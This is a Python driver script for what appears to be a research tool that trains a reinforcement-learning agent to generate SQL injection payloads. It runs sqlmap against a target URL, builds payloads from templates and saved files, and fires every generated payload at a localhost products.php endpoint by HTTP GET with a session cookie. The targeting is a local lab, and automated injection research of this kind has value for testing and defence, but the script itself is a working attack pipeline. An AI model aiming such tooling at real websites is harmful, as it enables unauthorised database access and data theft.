#!/usr/local/bin/python
import sys
import numpy as np
import requests
from sql_parser.contextual_template_populator import ContextualTemplatePopulator
from sql_parser.wikisql_parser import WikiSQLParser
from sqlmap_runner import SqlmapRunner
from sql_parser.token_parser import TokenParser
from sql_parser.sql_data_service import SQLDataService
from model.token_embedder import TokenEmbedder 
from model.ddpg import DDPG
from model.environment import Environment
from model.payload_builder import PayloadBuilder
from model.ddpg_hyperparameters import DDPGHyperparameters
import tensorflow as tf
import os

import sql_parser.schema_parser as schema_parser

# GPU private mode allows for optimisation. Thread count of two recommended but we set
# it to three.Environment variable documentation from:
# https://www.tensorflow.org/guide/gpu_performance_analysis#2_gpu_host_thread_contention
#
# TensorFlow environment variable setting solution by Prerak Mody from Performance Summary
# section in:
# https://towardsdatascience.com/profiling-in-tensorflow-2-x-576f5700124a
os.environ['TF_GPU_THREAD_MODE'] = 'gpu_private'
os.environ['TF_GPU_THREAD_COUNT'] = '3'

os.environ['TF_XLA_FLAGS'] = '--tf_xla_enable_xla_devices'

tf.config.optimizer.set_jit(True)

# TODO: Use argparse instead.
args = sys.argv[1:]

run_sqlmap = '--no-run-sqlmap' not in args
record_demonstrations = '--no-demonstrations' not in args
use_cache = '--from-cache' in args
double_requests = '--no-double-requests' not in args

embedding_data_rows = None

try:
    for arg in args:
        if arg.startswith('--embedding-dataset-count='):
            embedding_data_rows = int(arg.split('--embedding-dataset-count=')[1])
            break
except:
    pass

#
#
# !
# ! TODO: IMPORTANT: Add legal disclaimer.
# !
#
#

BATCH_SIZE = 4

EMBEDDING_DIM = 128

ACTION_SIZE = 20

# TODO: Ensure states does not need to be larger than action size.
#
# NOTE: Must be divisible by 2.
#
# This is the case because an entire action is currently set as
# the prefix of a state.
STATE_SIZE = 40

OPEN_URL = 'http://localhost/products.php?id='

HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'}
COOKIE = 'pma_lang=en; PHPSESSID=ddf9077013a6d31121128d958a4f2622; {flag}=9dcb88e0137649590b755372b040afad'

# Skips lowercase alphabet as SQL is case-insensitive.
visible_uppercase_chars = [chr(i) for i in range(32, 97)] + \
    [chr(i) for i in range(123, 127)]

sqlmap = SqlmapRunner(OPEN_URL, vulernable_param='id', default_vulnerable_param_value='1')

if run_sqlmap:
    print('Running sqlmap...')
    sqlmap.run(HEADERS, COOKIE)
    print('Attempted payloads gathered from sqlmap.')
else:
    print('Skipping running sqlmap...')

data_service = SQLDataService()

schema = data_service.load_schema()

columns = schema_parser.get_column_tokens_from_schema(schema)
tables = schema_parser.get_table_tokens_from_schema(schema)

sql_tokens = data_service.load_sql_tokens()
token_blacklist = data_service.load_sql_blacklist()

payload_templates = data_service.load_contextual_payload_templates()

# Get from cache for consistent tests.
payloads = ContextualTemplatePopulator(schema).generate_randomised_examples(templates=payload_templates)
data_service.save_contextual_payloads(payloads)

payloads += data_service.load_payload_files(domain_name='localhost')

dictionary = sql_tokens + tables + columns + visible_uppercase_chars + ['']

dictionary = [token.upper() for token in dictionary]

# Remove duplicate characters. For example, visible_uppercase_chars might contain '(',
# which may also be contained in sql_tokens.
dictionary = list(set(dictionary))

dictionary.sort(key=len, reverse=True)

token_parser = TokenParser(dictionary, token_blacklist)

if use_cache:
    print('Using cached embeddings...')
    embeddings = data_service.load_embeddings()
else:
    # MIGHT NOT BE USED BECAUSE OF LOWERCASE LETTERS.
    #
    # TODO: Ensure uppercase.
    queries = data_service.load_wikisql_queries()

    parser = WikiSQLParser(schema)
    queries = parser.generate_randomised_examples(queries)

    data_service.save_parsed_wikisql_queries(queries)

    # Prioritise payloads over queries if the full dataset is not used for embeddings.
    embedding_training_data = payloads + queries
    embedding_training_data = embedding_training_data if embedding_data_rows is None else embedding_training_data[:embedding_data_rows]

    print('Encoding SQL fragment(s) for embeddings...')
    embedding_training_data = token_parser.parse(embedding_training_data)
    print(f'{len(embedding_training_data)} fragment(s) encoded.')

    # TODO: Retrieve cached embeddings (if already generated) if dictionary and
    # embedding examples are unchanged.
    print('Running token embedder...')
    embeddings = TokenEmbedder(EMBEDDING_DIM).learn_embeddings(embedding_training_data, len(dictionary))
    print('Embeddings learned.')

    data_service.save_embeddings(embeddings.numpy().tolist())

headers = HEADERS.copy()
headers.update({'cookie': COOKIE})

payload_builder = PayloadBuilder(dictionary, '', '')

if record_demonstrations:
    print('Filtering unformatted payloads...')
    encoded_payloads = token_parser.parse(payloads, required_prefix=payload_builder.prefix, required_suffix=payload_builder.suffix)
    print('Payloads filtered.')
else:
    encoded_payloads = []

params = DDPGHyperparameters(
    gamma=0.999,
    tau=0.001,
    actor_learning_rate=0.00015,
    critic_learning_rate=0.0003,
    embedding_size=EMBEDDING_DIM,
    batch_size=BATCH_SIZE,
    starting_stddev=0.001,
    psi=0.99,
    temperature=0.5,
    n_step_rollout=1,
    learnings_per_batch=20,
    rollout_weight=0.0001,
    l2_weight=0.0001,
    priority_weight=0.0001,
    action_size=ACTION_SIZE,
    state_size=STATE_SIZE,
    prefix=payload_builder.prefix,
    suffix=payload_builder.suffix,
    # TODO: Add extend epsiode parameter.
)

environment = Environment(
    payload_builder=payload_builder,
    action_size=ACTION_SIZE,
    state_size=STATE_SIZE,
    frames_per_episode=BATCH_SIZE * 5,
    embeddings=embeddings,
    columns=columns,
    tables=tables,
    double_requests=double_requests,
    send_request_callback= lambda payload:
        requests.get(OPEN_URL + payload, headers=headers))
                                        
state: np.ndarray

def print_decoded_injections():
    '''
    Use to verify that the predefined encoded injection list is correctly
    encoded.
    '''
    for injection in encoded_payloads:
        decoded = [dictionary[i] for i in injection]
        print(''.join(decoded))

def main():
    ddpg = DDPG(
        environment,
        encoded_payloads=encoded_payloads,
        params=params
    )

    print('Running DDPG...')

    ddpg.run(run_demonstrations=record_demonstrations)

if __name__ == '__main__':
    main()